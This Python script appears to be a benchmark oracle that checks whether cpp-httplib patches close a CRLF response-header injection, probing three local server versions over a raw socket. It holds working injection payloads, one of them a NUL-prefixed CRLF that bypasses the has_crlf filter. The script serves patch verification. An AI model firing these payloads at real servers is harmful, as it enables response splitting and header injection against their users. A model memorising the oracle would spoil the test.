#!/usr/bin/env python3
"""PatchClosure-Bench oracle: cpp-httplib CRLF response-header injection.

Drives the REAL cpp-httplib servers over EXTERNAL HTTP using a RAW socket
(never a normalizing HTTP client) so we observe the actual response bytes and
can tell whether a CRLF-injected marker header physically appears on the wire.

Sink under test:  res.set_header("X-Echo", req.get_param_value("x"))

Two payloads, both attempting to inject a benign marker header
  X-Pcb-Inject: <PCB_FLAG>
via the reflected "x" parameter:

  original : x=SAFE%0d%0aX-Pcb-Inject:%20<FLAG>       (plain CRLF)
             -> covered by the CVE-2020-11709 has_crlf filter (blocked@V1)
  residual : x=SAFE%00%0d%0aX-Pcb-Inject:%20<FLAG>    (NUL-prefixed CRLF)
             -> bypasses has_crlf (it stops at the NUL), the CVE-2025-0825
                weakness; closed by the length-based is_field_value (blocked@V2)

Detection = the raw response contains the injected header line
  \\r\\nX-Pcb-Inject: <FLAG>\\r\\n
which can only be present if the CRLF passed through set_header unfiltered.
"""
import argparse
import os
import socket
import sys

FLAG = os.environ.get("PCB_FLAG", "PCB-CRLF-CANARY-0825")
MARKER = "X-Pcb-Inject: " + FLAG

PROFILES = {"v0": 18080, "v1": 18081, "v2": 18082}


def build_query(kind):
    # SAFE prefix then the injected marker header.
    if kind == "original":
        return "x=SAFE%0d%0aX-Pcb-Inject:%20" + FLAG.replace(" ", "%20")
    elif kind == "residual":
        # %00 = NUL byte inserted before the CRLF -> truncates the C-string
        # walked by has_crlf(val.c_str()).
        return "x=SAFE%00%0d%0aX-Pcb-Inject:%20" + FLAG.replace(" ", "%20")
    raise ValueError(kind)


def send_raw(host, port, query, timeout=8.0):
    req = (
        "GET /echo?" + query + " HTTP/1.1\r\n"
        "Host: pcb\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("latin-1")
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.sendall(req)
        chunks = []
        while True:
            b = s.recv(4096)
            if not b:
                break
            chunks.append(b)
        return b"".join(chunks)
    finally:
        s.close()


def injected(raw):
    """True iff the marker header physically appears as its own header line."""
    needle = ("\r\n" + MARKER + "\r\n").encode("latin-1")
    return needle in raw


def probe(profile, kind, host="127.0.0.1"):
    port = PROFILES[profile]
    raw = send_raw(host, port, build_query(kind))
    return injected(raw), raw


def run_gate():
    results = {}
    # original: inject@V0, blocked@V1  (and blocked@V2)
    results["original_poc_reaches_flag_on_v0"], r_o_v0 = probe("v0", "original")
    ok_v1_orig, _ = probe("v1", "original")
    results["original_poc_blocked_on_v1"] = not ok_v1_orig
    ok_v2_orig, _ = probe("v2", "original")
    results["original_blocked_on_v2"] = not ok_v2_orig
    # residual: inject@V1, blocked@V2
    results["bypass_poc_reaches_flag_on_v1"], r_r_v1 = probe("v1", "residual")
    ok_v2_res, _ = probe("v2", "residual")
    results["bypass_blocked_on_v2"] = not ok_v2_res
    # sanity: residual also injects@V0 (fully vulnerable baseline)
    res_v0, _ = probe("v0", "residual")
    results["residual_reaches_flag_on_v0_sanity"] = res_v0

    results["passed"] = (
        results["original_poc_reaches_flag_on_v0"]
        and results["original_poc_blocked_on_v1"]
        and results["bypass_poc_reaches_flag_on_v1"]
        and results["bypass_blocked_on_v2"]
        and results["original_blocked_on_v2"]
    )
    return results


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--profile", choices=list(PROFILES))
    ap.add_argument("--kind", choices=["original", "residual"])
    ap.add_argument("--show", action="store_true", help="dump raw response")
    args = ap.parse_args()

    if args.run_gate:
        res = run_gate()
        for k, v in res.items():
            print(f"{k}: {v}")
        print("\nGATE:", "PASS" if res["passed"] else "FAIL")
        sys.exit(0 if res["passed"] else 1)

    if args.profile and args.kind:
        ok, raw = probe(args.profile, args.kind)
        print(f"profile={args.profile} kind={args.kind} injected={ok}")
        if args.show:
            sys.stdout.write("----- raw response -----\n")
            sys.stdout.write(raw.decode("latin-1", "replace"))
        sys.exit(0)

    ap.print_help()


if __name__ == "__main__":
    main()
